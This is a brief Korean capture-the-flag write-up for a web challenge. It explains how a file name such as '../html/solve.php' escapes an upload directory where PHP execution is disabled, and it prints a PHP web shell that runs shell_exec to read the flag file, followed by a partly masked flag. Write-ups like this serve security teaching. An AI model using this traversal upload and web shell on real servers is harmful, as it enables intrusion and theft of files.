# Category

web

# Overview

How nice is your alpaca?

# Analysis

- `dockerfile`에서 생성되는 flag 이름이 md5sum값이 추가되어 `/flag-[a-zA-Z0-9].txt` 형식 생성된다.

- `uploads.conf`에서 `/var/www/uploads` 경로에 `php_admin_flag engine off`상태로 해당 경로에 `php` 파일을 올려서 실행시킬 수 가 없다.

# Exploitation

1. flag가 있는 위치와 형식에 맞게 `/flag-*.txt`를 조회하는 php파일을 생성하여 업로드한다.

   ```php
   # solve.php
   <?php
   $FLAG = shell_exec("cat /flag-*.txt");
   echo $FLAG;
   ?>
   ```

2. 파일을 업로드할 때 파일명을 `../html/solve.php`와 같이 수정하여 업로드하게 되면, 해당 `solve.php`파일은 상대경로에 따라 `/var/www/html/solve.php`에 위치하게 된다.

3. `/var/www/html` 경로에서는 `php_admin_flag engine off`와 같이 `php` 실행을 막는 부분이 없기 때문에
   업로드한 경로 `http://localhost:3000/solve.php`를 통해 flag를 가져올 수 있다.

# Flag

`Alpaca{1t...gh}`
